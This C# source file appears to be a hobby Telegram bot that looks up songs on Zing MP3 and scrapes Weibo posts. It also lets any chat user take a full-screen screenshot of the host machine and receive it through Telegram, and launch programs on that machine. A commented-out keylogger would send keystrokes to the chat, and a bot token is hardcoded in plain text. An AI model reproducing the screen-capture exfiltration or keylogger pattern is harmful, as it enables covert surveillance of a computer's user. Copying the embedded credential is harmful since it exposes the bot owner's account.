using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.InputFiles;
using xNet;

namespace BotTesst
{
   public class Bottele
    {
        public static void Capture()
        {
            Rectangle rectangle = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height))
            {
                using (Graphics graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(new Point(rectangle.Left, rectangle.Top), Point.Empty, rectangle.Size);
                    bitmap.Save("capture.jpg", ImageFormat.Jpeg);
                }
            }
        }

        public static string Get(HttpRequest http, string url)
        {
            http = new HttpRequest();
            var html = http.Get(url).ToString();
            return html;
        }
        public void Bot()
        {
            var botClient = new TelegramBotClient("2062090476:AAEecVC5yMt-Vd_-p6mfgL9w4VVPbh_sJj0");

            //var me = await botClient.GetMeAsync();
            //Console.WriteLine(
            //    $"Hello, World! I am user {me.Id} and my name is {me.FirstName}."
            //);

            //var cts = new CancellationTokenSource();
            botClient.StartReceiving();
            botClient.OnMessage += async (mess, acb) =>
            {
                string b = acb.Message.Text;
                string[] item = b.Split(':');
                string idd = acb.Message.Chat.Id.ToString();
                //if(item[0]== "Y")
                //    {
                //        string toStringKeys = "";
                //        for (Int32 i = 0; i < 255; i++)
                //        {
                //            int keyState = GetAsyncKeyState(i);
                //            if (keyState == 1 || keyState == -32767)
                //            {
                //                Console.WriteLine((Keys)i);

                //                //Console.WriteLine((Keys)i);
                //             toStringKeys += Convert.ToString((Keys)i);

                //                //System.IO.File.AppendAllText(Application.StartupPath + "\\KeyLogs.txt", Environment.NewLine + toStringKeys);
                //                break;
                //            }

                //        }
                //        botClient.SendTextMessageAsync(acb.Message.Chat.Id, toStringKeys);
                //    }
                if (item[0].ToLower() == "bài hát")
                {

                    HttpRequest http = new HttpRequest();
                    string url = " http://ac.mp3.zing.vn/complete?type=artist,song,key,code&num=500&query=" + item[1];
                    var json = Get(http, url);
                    JObject pairs = JObject.Parse(json);
                    String data = pairs["data"][0]["song"].ToString();
                    string idanme = "";
                    for (int i = 0; i < 10; i++)
                    {
                        var id = pairs["data"][0]["song"][i]["id"].ToString();
                        string name = pairs["data"][0]["song"][i]["name"].ToString();
                        idanme += id + " " + name + "\n";
                        //botClient.SendTextMessageAsync(acb.Message.Chat.Id, id+"\n"+name);
                    }
                    botClient.SendTextMessageAsync(acb.Message.Chat.Id, idanme);
                    //[0]["id"].ToString();
                }
                else
                {
                    botClient.SendTextMessageAsync(acb.Message.Chat.Id, "You said:" + b);
                }
                if (item[0] == "id")
                {
                    string id = item[1];
                    HttpRequest http = new HttpRequest();
                    string url = $"http://api.mp3.zing.vn/api/streaming/audio.co/" + id + "/320";
                    botClient.SendAudioAsync(acb.Message.Chat.Id, url);
                }
                if (b == "capture")
                {
                    Capture();
                    using (FileStream fi = System.IO.File.OpenRead("capture.jpg"))
                    {
                        InputOnlineFile input = new InputOnlineFile(fi, "capture.jpg");
                        var file = await botClient.SendDocumentAsync(acb.Message.Chat, input);
                    }
                }
                if (b == "notepad")
                {
                    Process.Start("notepad");
                }
                if (b == "calc")
                {
                    Process.Start("calc");
                }
                if (item[0] == "weibo")
                {
                    HttpRequest http = new HttpRequest();
                    string id = item[1].Trim();
                    if (id.Length == 10)
                    {
                        //string url = "https://m.weibo.cn/api/container/getIndex?jumpfrom=weibocom&type=uid&value="+id+"&containerid=100505"+id+"";
                        // string url = "https://m.weibo.cn/api/container/getIndex?jumpfrom=weibocom&type=uid&value=2535836307&containerid=1005052535836307";
                        //https://m.weibo.cn/api/container/getIndex?jumpfrom=weibocom&type=uid&value=5925195408&containerid=1076035925195408
                        string url = "https://m.weibo.cn/api/container/getIndex?jumpfrom=weibocom&type=uid&value=" + id + "&containerid=107603" + id + "&page=1";
                        // string url = "https://m.weibo.cn/u/" + id + "?jumpfrom=weibocom";
                        var json = Get(http, url);
                        JObject keys = JObject.Parse(json);
                        string data = keys["data"]["cards"][0]["mblog"]["text"].ToString();
                        botClient.SendTextMessageAsync(acb.Message.Chat.Id, "Caption" + data);
                        string picId = keys["data"]["cards"][0]["mblog"]["pic_ids"].ToString();
                        // string Sendpic = "";
                        for (int i = 0; i < keys["data"]["cards"][0]["mblog"]["pic_ids"].ToList().Count; i++)
                        {

                            var idpic = keys["data"]["cards"][0]["mblog"]["pic_ids"][i].ToString();
                            var linkpic = "https://wx3.sinaimg.cn//bmiddle//" + idpic + ".jpg";
                            botClient.SendMediaGroupAsync(acb.Message.Chat.Id, new IAlbumInputMedia[] { new InputMediaPhoto(linkpic) });
                        }
                    }
                    else
                    {
                        botClient.SendTextMessageAsync(acb.Message.Chat.Id, "Nhập sai id rồi bạn");
                    }
                    if (item[0] == "video")
                    {
                        string url = "https://m.weibo.cn/api/container/getIndex?type=uid&value=5874514144&containerid=1076035874514144";
                        HttpRequest http1 = new HttpRequest();
                        var json = Get(http, url);
                        JObject keys = JObject.Parse(json);
                        //   string data = keys["data"]

                    }
                    //string a = Translate(b);
                    //botClient.SendTextMessageAsync(acb.Message.Chat.Id, "You said: " + b);
                };
            };
            //Console.WriteLine($"Start listening for @{me.Username}");
        }
    }
}
